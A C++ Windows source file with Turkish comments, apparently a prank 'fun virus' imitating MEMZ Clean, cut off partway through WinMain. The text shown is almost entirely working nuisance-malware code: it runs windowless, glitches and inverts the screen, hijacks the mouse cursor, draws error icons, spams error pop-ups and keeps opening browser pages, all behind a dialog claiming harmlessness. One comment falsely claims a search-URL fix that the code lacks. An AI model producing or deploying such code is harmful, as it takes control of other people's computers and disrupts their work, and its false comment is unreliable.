#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:WinMainCRTStartup")
#include <windows.h>
#include <cmath>

// 1. Efekt: Ekranı Rastgele Titretme ve Renkleri Ters Çevirme
DWORD WINAPI ScreenGlitch(LPVOID lpParam) {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    while (TRUE) {
        HDC hdc = GetDC(NULL);
        int x = rand() % 20 - 10;
        int y = rand() % 20 - 10;
        BitBlt(hdc, x, y, screenWidth, screenHeight, hdc, 0, 0, SRCCOPY);
        if (rand() % 5 == 0) {
            BitBlt(hdc, 0, 0, screenWidth, screenHeight, hdc, 0, 0, DSTINVERT);
        }
        ReleaseDC(NULL, hdc);
        Sleep(100);
    }
}

// 2. Efekt: Fare İmlecini Çılgınca Döndürme
DWORD WINAPI CrazyMouse(LPVOID lpParam) {
    int angle = 0;
    while (TRUE) {
        POINT mp;
        GetCursorPos(&mp);
        int newX = mp.x + (int)(sin(angle) * 10);
        int newY = mp.y + (int)(cos(angle) * 10);
        SetCursorPos(newX, newY);
        angle += 1;
        Sleep(20);
    }
}

// 3. Efekt: Farenin Altında Sürekli Kırmızı Çarpı Çıkması
DWORD WINAPI MouseErrors(LPVOID lpParam) {
    HICON hIcon = LoadIcon(NULL, IDI_ERROR);
    while (TRUE) {
        HDC hdc = GetDC(NULL);
        POINT mp;
        GetCursorPos(&mp);
        DrawIcon(hdc, mp.x - 10, mp.y - 10, hIcon);
        ReleaseDC(NULL, hdc);
        Sleep(50);
    }
}

// 4. Efekt: Belli Aralıklarla "lol" Başlıklı Pencereler Açma
DWORD WINAPI PopUpSpam(LPVOID lpParam) {
    while (TRUE) {
        Sleep(4000);
        MessageBeep(MB_ICONERROR);
        MessageBoxA(NULL, "Bilgisayari hala kullanabiliyor musun?", "lol", MB_OK | MB_ICONERROR | MB_SERVICE_NOTIFICATION);
    }
}

// 5. Efekt: Her 30 Saniyede Bir Rastgele Google Araması veya Gemini Açma
DWORD WINAPI WebSpam(LPVOID lpParam) {
    const char* queries[] = {
        "ie11+is+better",
        "edge+vasat",
        "iphone+xs+max+hala+kullanilir+mi"
    };

    while (TRUE) {
        Sleep(30000);

        int choice = rand() % 4;
        char url[512];

        if (choice == 3) {
            ShellExecuteA(NULL, "open", "microsoft-edge:https://gemini.google.com", NULL, NULL, SW_SHOWNORMAL);
        }
        else {
            // ŞİMDİ KESİNLİKLE DOĞRU: /search?q=%s tırnak içine eklendi ve queries[choice] artık çalışacak!
            wsprintfA(url, "microsoft-edge:https://google.com", queries[choice]);
            ShellExecuteA(NULL, "open", url, NULL, NULL, SW_SHOWNORMAL);
        }
    }
}

// Ana Program Başlangıcı
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    MessageBoxA(NULL, "Bu bir eglence virusudur. Dosyalara kesinlikle ellememez ve sisteme zarari yoktur. MEMZ Clean gibi calisir.", "MEMZ Clean TR", MB_OK | MB_ICONINFORMATION);

    CreateThread(NULL, 0, ScreenGlitch, NULL, 0, NULL);
